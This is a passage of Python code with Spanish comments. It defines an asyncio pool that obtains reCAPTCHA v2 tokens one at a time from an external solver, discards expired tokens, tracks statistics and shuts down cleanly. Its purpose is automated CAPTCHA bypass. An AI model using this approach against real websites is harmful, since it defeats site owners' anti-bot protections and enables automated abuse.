                    self._stats["expired"] += 1
            except asyncio.QueueEmpty:
                break
        for item in fresh:
            self.pool.put_nowait(item)
        if drained > 0:
            logger.info(f"[POOL] Drenados {drained} tokens expirados")

    # ── Obtener token (1:1 JIT On-Demand) ──────────────────────────────

    async def get_token(self, timeout: float = 120.0) -> Optional[tuple]:
        """
        Obtiene un token fresco del pool.
        Si hay uno válido en cola, lo entrega.
        Si no, resuelve EXACTAMENTE 1 token bajo demanda en tiempo real.
        Cero tokens huérfanos que expiren en el vacío.
        """
        if self.stopped:
            return None

        # 1. Revisar si hay un token fresco en el pool (ej. por reintento inmediato)
        while not self.pool.empty():
            try:
                token, task_id, ts = self.pool.get_nowait()
                age = time.time() - ts
                if age < self.TOKEN_MAX_AGE:
                    logger.info(f"[POOL] 🎫 Token fresco entregado del pool (edad: {age:.0f}s)")
                    return (token, task_id)
                else:
                    self._stats["expired"] += 1
                    self._stats["wasted"] += 1
                    logger.debug(f"[POOL] Token descartado por edad ({age:.0f}s)")
            except asyncio.QueueEmpty:
                break

        # 2. Resolver exactamente 1 token bajo demanda (JIT)
        self._stats["requested"] += 1
        self._pending_solves += 1
        try:
            logger.info("[POOL] 🔑 Solicitando 1 resolución de captcha bajo demanda...")
            result = await asyncio.wait_for(
                self.solver.get_recaptcha_v2_token(self.website_url, self.website_key),
                timeout=timeout,
            )
            if result and not self.stopped:
                token, task_id = result
                self._stats["resolved"] += 1
                self._consecutive_failures = 0
                logger.info("[POOL] ✅ 1 Token resuelto y entregado bajo demanda")
                return (token, task_id)
            else:
                self._stats["failed"] += 1
                self._consecutive_failures += 1
                return None
        except asyncio.TimeoutError:
            self._stats["failed"] += 1
            self._consecutive_failures += 1
            logger.warning(f"[POOL] Timeout ({timeout}s) resolviendo captcha bajo demanda")
            return None
        except asyncio.CancelledError:
            return None
        except Exception as e:
            self._stats["failed"] += 1
            self._consecutive_failures += 1
            logger.error(f"[POOL] Error resolviendo captcha: {e}")
            return None
        finally:
            self._pending_solves = max(0, self._pending_solves - 1)

    # ── Resolver un captcha ────────────────────────────────────────────

    async def _solve_one(self):
        """Compatibilidad para callers que llamen a _solve_one directamente."""
        res = await self.get_token()
        if res:
            await self.pool.put((res[0], res[1], time.time()))

    # ── Control ────────────────────────────────────────────────────────

    async def stop(self):
        """Apaga factory, cancela tasks pendientes y drena pool."""
        self.stopped = True

        # Cancelar factory loop
        if self._factory_task and not self._factory_task.done():
            self._factory_task.cancel()
            try:
                await self._factory_task
            except (asyncio.CancelledError, Exception):
                pass

        # Cancelar todos los tasks de solve activos
        for task in list(self._active_tasks):
            if not task.done():
                task.cancel()
        # Esperar a que terminen (con timeout corto)
        if self._active_tasks:
            await asyncio.gather(*list(self._active_tasks), return_exceptions=True)
        self._active_tasks.clear()

        # Drenar pool
        drained = 0
        while not self.pool.empty():
            try:
                self.pool.get_nowait()
                drained += 1
            except asyncio.QueueEmpty:
                break
        logger.info(
            f"[POOL] Detenido. Drenados: {drained} tokens. "
            f"Stats: {self.stats}"
        )

    @property
    def stats(self) -> Dict:
        """Estadísticas del pool."""
        return {
            **self._stats,
            "pool_size": self.pool.qsize(),
            "stopped": self.stopped,
        }
